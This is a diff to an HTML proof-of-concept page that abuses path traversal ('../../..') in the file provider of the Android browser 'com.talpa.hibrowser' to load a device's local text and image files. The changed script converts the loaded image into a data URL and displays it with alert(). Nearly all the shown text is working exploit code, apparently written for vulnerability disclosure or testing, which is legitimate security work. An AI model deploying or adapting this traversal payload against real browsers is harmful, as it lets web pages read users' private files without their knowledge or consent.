@@ -5,37 +5,23 @@
     <iframe name='test123' src="content://com.talpa.hibrowser.fileProvider/external_files/../../../../../../../../../storage/emulated/0/documents/test.txt" type="text/plain"> </iframe>
     <img id='test' src='content://com.talpa.hibrowser.fileProvider/external_files/../../../../../../../../../storage/emulated/0/Pictures/test.jpg'/>
 <script>
-function toDataURL(url, callback){
-    var xhr = new XMLHttpRequest();
-    xhr.open('get', url);
-    xhr.responseType = 'blob';
-    xhr.onload = function(){
-      var fr = new FileReader();
-    
-      fr.onload = function(){
-        callback(this.result);
-      };
-    
-      fr.readAsDataURL(xhr.response); // async call
-    };
-    
-    xhr.send();
+function getDataUrl(img) {
+   // Create canvas
+   const canvas = document.createElement('canvas');
+   const ctx = canvas.getContext('2d');
+   // Set width and height
+   canvas.width = img.width;
+   canvas.height = img.height;
+   // Draw the image
+   ctx.drawImage(img, 0, 0);
+   return canvas.toDataURL('image/jpeg');
 }
-
-toDataURL(document.getElementById('test').src, function(dataURL){
-  result.src = dataURL;
-
-  // now just to show that passing to a canvas doesn't hold the same results
-  var canvas = document.createElement('canvas');
-  canvas.width = document.getElementById('test').naturalWidth;
-  canvas.height = document.getElementById('test').naturalHeight;
-  canvas.getContext('2d').drawImage(myImage, 0,0);
-
-  console.log(canvas.toDataURL() === dataURL); // false - not same data
-  });
-  setTimeout(function () {
-    alert(dataURL)
-        }, 1000);
+// Select the image
+const img = document.querySelector('img');
+img.addEventListener('load', function (event) {
+   const dataUrl = getDataUrl(event.currentTarget);
+   alert(dataUrl);
+});
 </script>
     </body>
  </html>
